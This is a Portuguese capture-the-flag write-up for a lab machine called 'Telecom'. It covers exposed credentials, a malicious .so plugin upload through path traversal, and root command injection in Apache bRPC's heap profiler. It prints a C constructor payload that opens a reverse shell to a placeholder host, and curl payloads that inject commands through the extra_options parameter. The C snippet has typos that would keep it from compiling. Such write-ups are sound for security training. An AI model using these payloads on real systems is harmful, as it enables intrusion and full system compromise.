# Telecom

![Telecom](/images/hackingclub-telecom/file-telecom-2026-1.png)

## Sumário

A exploração da máquina teve início com a enumeração de subdomínios, onde foi identificado um endpoint exposto em `/api/config` contendo credenciais da aplicação. Com essas informações, foi possível acessar o painel administrativo.

Dentro do painel, foi encontrado um recurso de upload de plugins, que aceitava arquivos `.so` carregados dinamicamente. Explorando essa funcionalidade, foi desenvolvido um payload em C contendo uma shell reversa, posteriormente compilado como `telemetry.so`. Durante o upload, utilizou-se interceptação via Burp Suite para manipular o caminho do arquivo, empregando `path traversal (../)` para salvá-lo em um diretório acessível pela aplicação.

Ao acessar o endpoint correspondente `(/telemetry)`, o plugin malicioso foi carregado, resultando na execução da shell reversa e acesso inicial à máquina.

Na fase de pós-exploração, foi identificado um serviço`(brpc)` rodando localmente na porta `8000`. Após análise, verificou-se que se tratava de um serviço vulnerável a `command injection`, conforme uma `CVE` pública. Como o serviço era executado com privilégios de `root`, a exploração permitiu a execução de comandos arbitrários com alto nível de privilégio, possibilitando acesso ao diretório `/root` e, consequentemente, a escalada completa de privilégios.

## Enumeração

Durante a fase de enumeração da aplicação, foi identificado o subdomínio `telemetry`. A partir dele, foi conduzida uma análise mais aprofundada utilizando técnicas de directory e file fuzzing, com o objetivo de identificar recursos ocultos.

Como resultado, foi descoberta a rota `/api/config`, a qual se encontrava indevidamente exposta. Essa endpoint retornava informações sensíveis da aplicação, incluindo `credenciais de autenticação` do painel administrativo, configurando uma falha crítica de `exposição de dados (Sensitive Information Disclosure)`.

![Subdomain](/images/hackingclub-telecom/file-telecom-2026-3.png)
![Panel](/images/hackingclub-telecom/file-telecom-2026-4.png)
![Api](/images/hackingclub-telecom/file-telecom-2026-5.png)
![Credentials](/images/hackingclub-telecom/file-telecom-2026-6.png)

## Plugin Upload

Após a autenticação no painel administrativo, foi identificado um recurso de upload de plugins, o qual permitia o envio de arquivos no formato `.so (shared objects)`. Esses arquivos eram carregados dinamicamente pela aplicação em tempo de execução, indicando um potencial vetor crítico para execução de código arbitrário `(Remote Code Execution – RCE)`.

- [Python Dirty Arbitrary File Write to RCE via Writing Shared Object Files Or Overwriting Bytecode Files](https://siunam321.github.io/research/python-dirty-arbitrary-file-write-to-rce-via-writing-shared-object-files-or-overwriting-bytecode-files/)

![Plugin](/images/hackingclub-telecom/file-telecom-2026-7.png)

### Shell em C

Para explorar o vetor identificado, foi desenvolvido um payload em linguagem C contendo uma reverse shell.

```bash
#include <stdlib.h>

__atributte__((constructor))
void run(){
    system("bash -c 'sh -i >& /dev/tcp/IP_ADDRESS/PORT 0>&1'")
}
```

![Shell](/images/hackingclub-telecom/file-telecom-2026-8.png)

#### Compile

O código foi então compilado no formato de biblioteca compartilhada `(.so)`, compatível com o mecanismo de carregamento dinâmico da aplicação.

```bash
gcc -shared -fPIC archive.c -o telemetry.so
```

![Compile](/images/hackingclub-telecom/file-telecom-2026-9.png)

Após o envio do arquivo, a requisição foi interceptada utilizando o Burp Suite. Durante essa etapa, explorou-se uma vulnerabilidade de `Path Traversal`, manipulando o parâmetro `filename` com sequências como `../`, de modo a alterar o diretório de destino do upload.

Essa técnica permitiu gravar o arquivo em um caminho acessível pela aplicação, garantindo que o plugin malicioso fosse posteriormente carregado e executado pelo sistema.

![Burp Path Traversal](/images/hackingclub-telecom/file-telecom-2026-10.png)

Com o upload realizado, para que o plugin malicioso fosse efetivamente carregado, foi necessário acessar o endpoint `/telemetry`. Ao realizar essa requisição, a aplicação acionava seu mecanismo interno de carregamento dinâmico de plugins.

No backend, esse processo consistia na busca e carregamento automático de bibliotecas compartilhadas `(.so)` presentes em um diretório específico. Essas bibliotecas eram vinculadas em tempo de execução por meio de chamadas como `dlopen`, comuns em aplicações que implementam sistemas de extensões/plugins. Uma vez carregada, funções específicas previamente definidas (como rotinas de inicialização) eram executadas automaticamente.

Dessa forma, ao posicionar o arquivo malicioso em um diretório acessível pela aplicação `(via Path Traversal)`, garantiu-se que ele fosse incluído no fluxo de carregamento do sistema. Esse comportamento é consistente com cenários documentados em pesquisas de segurança, onde a escrita arbitrária de arquivos `.so` pode ser explorada para alcançar execução de código, uma vez que o interpretador ou aplicação carrega dinamicamente esses módulos.

Como resultado, ao acessar `/telemetry`, a biblioteca `telemetry.so` foi carregada pelo backend e seu código executado, disparando a reverse shell e concedendo acesso inicial ao sistema.

![Plugin Upload](/images/hackingclub-telecom/file-telecom-2026-11.png)
![Shell](/images/hackingclub-telecom/file-telecom-2026-12.png)

## Privilege Escalation

Ao realizar a enumeração do sistema comprometido, foi identificado um serviço escutando localmente na porta `8000`. Para identificar sua natureza, foi realizada uma requisição via `curl` ao endpoint local, revelando tratar-se de um serviço baseado em `Apache bRPC`, um framework de Remote Procedure Call (RPC) amplamente utilizado para comunicação entre serviços distribuídos.

![bRPC](/images/hackingclub-telecom/file-telecom-2026-13.png)
![bRPC](/images/hackingclub-telecom/file-telecom-2026-14.png)

Com o objetivo de escalar privilégios, foi verificado que o serviço era executado com o usuário `root`, aumentando significativamente o impacto potencial de qualquer vulnerabilidade explorável. A partir disso, foi conduzida uma breve pesquisa, que levou à identificação da vulnerabilidade `CVE-2025-60021`, um `command injection crítico (CVSS 9.8)`.

![bRPC User](/images/hackingclub-telecom/file-telecom-2026-15.png)

- [CVE-2025-60021 (CVSS 9.8): command injection in Apache bRPC heap profiler](https://www.cyberark.com/resources/threat-research-blog/cve-2025-60021-cvss-9-8-command-injection-in-apache-brpc-heap-profiler)

Essa vulnerabilidade afeta o serviço interno de heap profiling do bRPC, normalmente exposto através do endpoint `/pprof/heap`. O problema reside na ausência de validação adequada de um parâmetro controlado pelo usuário, denominado `extra_options`. Esse parâmetro é diretamente concatenado e executado como argumento de linha de comando no sistema, sem qualquer sanitização.

Na prática, isso permite que um atacante injete comandos arbitrários no sistema operacional ao manipular esse parâmetro, caracterizando uma falha clássica de Command Injection (CWE-77). A exploração é particularmente crítica pois:

- Não requer autenticação
- Pode ser explorada remotamente
- Executa comandos com os privilégios do processo bRPC

Em cenários onde o serviço está rodando como root, como observado durante a exploração, o impacto é total, permitindo execução de comandos com privilégios máximos, leitura de arquivos sensíveis (como `/root`), e comprometimento completo do sistema.

![Read /root](/images/hackingclub-telecom/file-telecom-2026-16.png)

#### Payload

```bash
curl 'http://127.0.0.1:8000/pprof/heap?display=text&extra_options=;ls${IFS}/root>/tmp/output;'
```

Considerando que o objetivo final era obter a root flag, o comando inicialmente executado teve como propósito enumerar o conteúdo do diretório `/root`, permitindo identificar os arquivos presentes nesse caminho privilegiado.

A partir dessas informações, foi possível elaborar uma nova requisição, desta vez direcionada especificamente à leitura do conteúdo do arquivo de interesse, resultando na obtenção da flag com privilégios de root.

```bash
curl 'http://127.0.0.1:8000/pprof/heap?display=text&extra_options=;cat${IFS}/root/root.txt>/home/telemetry/flagroot;'
```

![Root](/images/hackingclub-telecom/file-telecom-2026-17.png)